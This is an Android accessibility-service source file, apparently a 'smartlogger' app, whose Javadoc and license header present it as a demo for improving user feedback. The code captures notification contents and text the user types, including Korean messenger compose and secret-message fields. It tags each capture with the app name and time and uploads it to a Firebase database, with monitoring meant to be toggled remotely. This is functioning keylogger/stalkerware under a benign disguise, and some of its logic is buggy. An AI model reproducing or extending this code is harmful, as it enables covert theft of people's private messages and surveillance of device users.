/*
 * Copyright (C) 2011 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License"); you may not
 * use this file except in compliance with the License. You may obtain a copy of
 * the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
 * WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
 * License for the specific language governing permissions and limitations under
 * the License.
 */

package smartmonitor.google.com.smartlogger;


import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.speech.tts.TextToSpeech.OnInitListener;
import android.text.format.DateFormat;
import android.util.Log;
import android.view.KeyEvent;
import android.view.accessibility.AccessibilityEvent;

import com.google.firebase.remoteconfig.FirebaseRemoteConfig;

import java.util.Date;

import smartmonitor.google.com.smartlogger.Data.AccessibilityData;
import smartmonitor.google.com.smartlogger.writer.DataWritingInterface;
import smartmonitor.google.com.smartlogger.writer.FirebaseDBWriter;

/**
 * This class demonstrates how an accessibility service can query
 * window content to improve the feedback given to the user.
 */
public class MyAccessibilityService extends AccessibilityService implements OnInitListener {
    AccessibilityServiceInfo info;
    DataWritingInterface writer;
    private final String TAG = "AccessTest";
    private String dataFormatYMDhms = "MM/dd HH:mm";
    private DateFormat dateFormat;
    AccessibilityData data;
    private String message;
    private FirebaseRemoteConfig mFirebaseRemoteConfig;
    private boolean monitorEnabled = true;
    private String currentText;


    /**
     * Processes an AccessibilityEvent, by traversing the View's tree and
     * putting together a message to speak to the user.
     */
    public void onAccessibilityEvent(AccessibilityEvent event) {
        try {
            currentText = event.getText().toString();
            if (monitorEnabled) {
                if (event.getEventType() == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
                    if (!currentText.equals("[]")) {
                        data.setContents(currentText);
                        data.setApkName(event.getPackageName().toString());
                        data.setDate(getDate(System.currentTimeMillis()));
                        writer.write(data);
                    }
                } else if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED) {
                    if (currentText.equals("[]") || currentText.equals("[메시지 쓰기...]") || currentText.equals("[비밀 메시지]")) {
                        if (message != null || !message.equals("[]")) {
                            data.setContents(message);
                            data.setApkName(event.getPackageName().toString());
                            data.setDate(getDate(System.currentTimeMillis()));
                            writer.write(data);
                            message = null;
                        }
                    }
                } else if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                    message = currentText;
                }
//                } else if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
//                    Log.e(TAG, "Catch Event Type: " + AccessibilityEvent.eventTypeToString(event.getEventType()));
//                    Log.e(TAG, "Catch Event Package Name : " + event.getPackageName());
                    //Log.e(TAG, "Catch Event TEXT : " + event.getText());
//                    Log.e(TAG, "Catch Event ContentDescription  : " + event.getContentDescription());
//                    Log.e(TAG, "Catch Event getSource : " + event.getSource());
//                    Log.e(TAG, "=========================================================================");
//                }

//                Log.e(TAG, "Catch Event Type: " + AccessibilityEvent.eventTypeToString(event.getEventType()));
//                Log.e(TAG, "Catch Event Package Name : " + event.getPackageName());
//                Log.e(TAG, "Catch Event TEXT : " + event.getText());
//                Log.e(TAG, "Catch Event ContentDescription  : " + event.getContentDescription());
//                Log.e(TAG, "Catch Event getSource : " + event.getSource());
//                Log.e(TAG, "=========================================================================");
            }
        } catch (Exception e) {
//            data.setContents("Error occured: " + e);
//            data.setApkName(event.getPackageName().toString());
//            data.setDate(getDate(System.currentTimeMillis()));
//            writer.write(data);
        }
    }

//    private String getPrettyString(AccessibilityEvent event) {
//        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED) {
//            //return getDate(System.currentTimeMillis()) + " " + event.getPackageName() + " " + event.getText();
//            return event.getText() + " " + getDate(System.currentTimeMillis()) + " " + event.getPackageName();
//        } else {
//            // AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED
//            //return getDate(System.currentTimeMillis()) + " " + event.getPackageName() + " NOTI " + event.getText();
//            return "NOTI " + event.getText() + " " + getDate(System.currentTimeMillis()) + " " + event.getPackageName();
//        }
//    }

    private String getDate(long milliSeconds) {
        return dateFormat.format(dataFormatYMDhms, new Date(milliSeconds)).toString();
    }

    @Override
    public void onCreate() {
        Log.d(TAG, "onCreate");
        super.onCreate();
    }


    // 접근성 권한을 가지고, 연결이 되면 호출되는 함수
    public void onServiceConnected() {
        Log.d(TAG, "onServiceCOnnected");
        //firebase remote config
//        mFirebaseRemoteConfig = FirebaseRemoteConfig.getInstance();
//        mFirebaseRemoteConfig.setDefaults(R.xml.remote_config_defaults);
//        mFirebaseRemoteConfig.fetch()
//                .addOnCompleteListener(new OnCompleteListener<Void>() {
//                    @Override
//                    public void onComplete(@NonNull Task<Void> task) {
//                        if (task.isSuccessful()) {
//
//                            // After config data is successfully fetched, it must be activated before newly fetched
//                            // values are returned.
//                            mFirebaseRemoteConfig.activateFetched();
//                            monitorEnabled = mFirebaseRemoteConfig.getBoolean("monitor_enabled");
//                            Log.d(TAG, "onComplete " + monitorEnabled);
//                            if (!monitorEnabled) {
//                                setServiceInfo(null);
//                            }
//                        } else {
//                            Log.d(TAG, "fail");
//                        }
//                    }
//                });

        if (monitorEnabled) {

            writer = FirebaseDBWriter.getInstance();
            //writer = FileWriter.getInstance();
            info = new AccessibilityServiceInfo();
            dateFormat = new DateFormat();
            data = new AccessibilityData();

            //TYPE_VIEW_TEXT_SELECTION_CHANGED //텍스트 입력시
            //TYPE_NOTIFICATION_STATE_CHANGED //노티 도착시
            //TYPE_VIEW_CLICKED //카톡방 새로운 글
            //info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK - AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED - AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED; // 전체 이벤트 가져오기
            //info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK - AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED - AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED; // 전체 이벤트 가져오기
            info.eventTypes =
                    AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
                            |
                            AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED
                            |
                            AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED
//                            |
//                            AccessibilityEvent.TYPE_VIEW_SCROLLED
//                            |
//                            AccessibilityEvent.TYPE_VIEW_CONTEXT_CLICKED
//                            |
//                            AccessibilityEvent.TYPE_VIEW_CLICKED
//                            |
//                            AccessibilityEvent.TYPES_ALL_MASK
//                            |
//                            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
            ;
            info.feedbackType = AccessibilityServiceInfo.DEFAULT
//                        | AccessibilityServiceInfo.FEEDBACK_ALL_MASK
                    | AccessibilityServiceInfo.FEEDBACK_HAPTIC
            ;

            //info.notificationTimeout = 100; // millisecond

            setServiceInfo(info);
        }
    }

    /**
     * {@inheritDoc}
     */
    @Override
    public void onInterrupt() {
        /* do nothing */
    }

    /**
     * {@inheritDoc}
     */
    @Override
    public void onInit(int status) {
    }

    /**
     * {@inheritDoc}
     */
    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    @Override
    protected boolean onKeyEvent(KeyEvent event) {
        //(TAG, "onKeyEvent " + event.getKeyCode());
        return false;
    }
}


//        Log.e(TAG, "Catch Event Time: " + getDate(event.getEventTime()));
//Log.e(TAG, "Catch Event Type: " + AccessibilityEvent.eventTypeToString(event.getEventType()));
//        Log.e(TAG, "Catch Event Package Name : " + event.getPackageName());
//        Log.e(TAG, "Catch Event TEXT : " + event.getText());
//Log.e(TAG, "Catch Event ContentDescription  : " + event.getContentDescription());
//        //Log.e(TAG, "Catch Event getSource : " + event.getSource());
//Log.e(TAG, "=========================================================================");